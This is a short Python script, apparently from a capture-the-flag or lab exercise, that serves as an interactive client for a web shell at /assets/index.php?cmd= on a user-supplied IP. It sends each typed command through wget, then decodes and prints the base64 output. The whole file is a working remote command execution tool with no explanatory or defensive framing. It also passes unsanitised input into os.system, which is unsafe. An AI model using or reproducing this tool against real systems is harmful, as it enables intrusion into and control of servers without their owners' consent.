import os  # For running commands on os
import base64  # to decode base64
import urllib.parse  # For URL encoding
import sys  # To check command-line arguments

# Check if the user ran the script with the -h tag
if '-h' in sys.argv or '--help' in sys.argv:
    print("Usage: Run the script without any tags or arguments.")
    print("Example: python script_name.py")
    sys.exit(0)  

# Take IP input from the user
ip = input("Enter ip: ")

# Start the loop to continuously ask for commands
while True:
    # Take user command input and assign it to a variable
    command = input("Enter command to run (or 'exit' to quit): ")

    # Exit the loop if the user types 'exit'
    if command.lower() == "exit":
        print("Exiting...")
        break
    else:
        # URL-encode the command
        encoded_command = urllib.parse.quote(command)

        # Set full exploit URL with the encoded command
        url = "http://" + ip + "/assets/index.php?cmd=" + encoded_command

        # Set temp file name variable to save to
        filename = "rizz.txt"

        # Run wget and save it to file
        os.system("wget " + url + " -O " + filename)

        # Read the content of the file
        with open(filename, "rb") as file:
            encoded_data = file.read()

        # Decode the base64 content
        decoded_data = base64.b64decode(encoded_data)

        os.system("clear")

        # Convert decoded data to a string and clean up
        cleaned_data = decoded_data.decode('utf-8', errors='ignore').strip()

        # Print cleaned data
        print(cleaned_data)

        # Delete file once decoded
        os.system("rm " + filename)
